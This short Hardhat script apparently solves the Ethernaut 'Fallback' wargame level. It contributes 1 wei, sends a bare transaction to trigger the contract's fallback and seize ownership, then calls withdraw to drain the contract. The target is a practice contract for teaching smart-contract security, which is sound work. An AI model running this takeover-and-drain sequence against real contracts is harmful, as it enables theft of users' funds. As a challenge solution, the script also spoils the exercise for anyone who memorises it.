import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x3B02fF1e626Ed7a8fd6eC5299e2C54e1421B626B";
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Fallback", CONTRACT_ADDRESS, signer);

    await contract.contribute({value: 1});

    await signer.sendTransaction({ to: contract.address, value: 1, });

    await contract.withdraw();
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
